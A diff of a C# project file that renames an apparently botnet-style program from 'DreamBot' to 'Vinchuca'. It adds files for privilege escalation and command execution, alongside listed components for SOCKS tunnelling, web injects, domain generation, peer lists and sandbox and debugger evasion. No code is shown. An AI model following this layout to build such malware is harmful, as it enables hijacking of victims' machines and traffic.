@@ -7,8 +7,8 @@
     <ProjectGuid>{2292594A-DEAA-4E38-B794-ACAF9400448A}</ProjectGuid>
     <OutputType>Exe</OutputType>
     <AppDesignerFolder>Properties</AppDesignerFolder>
-    <RootNamespace>DreamBot</RootNamespace>
-    <AssemblyName>DreamBot</AssemblyName>
+    <RootNamespace>Vinchuca</RootNamespace>
+    <AssemblyName>Vinchuca</AssemblyName>
     <TargetFrameworkVersion>v2.0</TargetFrameworkVersion>
     <FileAlignment>512</FileAlignment>
     <TargetFrameworkProfile />
@@ -35,7 +35,7 @@
   </PropertyGroup>
   <PropertyGroup />
   <PropertyGroup>
-    <StartupObject>DreamBot.Bot</StartupObject>
+    <StartupObject>Vinchuca.EntryPoint</StartupObject>
   </PropertyGroup>
   <ItemGroup>
     <Reference Include="System" />
@@ -53,6 +53,7 @@
     <Compile Include="Actions\Socks5\SocksRequest.cs" />
     <Compile Include="Actions\Socks5\SocksTunnel.cs" />
     <Compile Include="Actions\WebInject\HttpsProxyServer.cs" />
+    <Compile Include="Main.cs" />
     <Compile Include="Crypto\Aes.cs" />
     <Compile Include="Crypto\BigInteger.cs" />
     <Compile Include="Crypto\DiffieHellmanKeyExchange.cs" />
@@ -79,7 +80,7 @@
     <Compile Include="Crypto\Signature.cs" />
     <Compile Include="Debugging\Dumper.cs" />
     <Compile Include="DGA\Dga.cs" />
-    <Compile Include="Bot.cs" />
+    <Compile Include="Agent.cs" />
     <Compile Include="Logger.cs" />
     <Compile Include="Network\Comunication\CommunicationManager.cs" />
     <Compile Include="Network\ConnectivityTester.cs" />
@@ -96,6 +97,8 @@
     <Compile Include="Network\Protocol\Peers\PeerList.cs" />
     <Compile Include="Network\SFP\F.cs" />
     <Compile Include="RemoveAttribute.cs" />
+    <Compile Include="Spread\PrivilegeScalation.cs" />
+    <Compile Include="System\CommandExecutor.cs" />
     <Compile Include="System\DateTimeProvider.cs" />
     <Compile Include="System\Evation\AntiDebugging.cs" />
     <Compile Include="System\Evation\SandboxDetection.cs" />
